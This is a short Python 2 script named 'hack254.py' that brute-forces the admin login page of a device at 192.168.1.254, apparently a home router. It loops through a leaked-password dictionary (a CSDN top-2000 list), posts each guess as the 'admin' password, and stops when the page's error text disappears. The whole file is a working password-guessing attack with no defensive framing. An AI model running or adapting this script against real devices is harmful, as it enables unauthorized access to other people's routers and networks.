#!/usr/bin/python
#coding:utf-8
#Filename : hack254.py
#Author   :   Will
import sys, os, urllib, urllib2
targetUrl = 'http://192.168.1.254/userLogin.asp'
#passDic = '/home/will/software/hack/data/Top500.txt'
passDic = '/home/will/software/hack/data/csdn/user/top2000_pw.txt'
def hack254(password,url):
	postData = {
		'account':'admin',
		'btnSubmit':'登录',
		'password':password,
		'save2cookie':'',
		'vldcode':''
	}
	opener = urllib2.build_opener()	
	req = urllib2.Request(targetUrl, urllib.urlencode(postData))
	try:
		html = opener.open(req, timeout=10).read()
		html = html.decode('gb2312', 'ignore').encode('utf-8')
		if html.find('请输入用户名！') < 0:
			print html.find('请输入用户名！')
			print password+" suc!"
			sys.exit()
		else:
			print password+' fail!'
		opener.close()
	except Exception:
		print password+' Timeout!'
		pass

i = 0
f = file(passDic)
while True:
	line = f.readline()
	if len(line) == 0:
		break
	hack254(line.strip(),targetUrl)
	i += 1
	print 'line[%d]' % i
f.close()

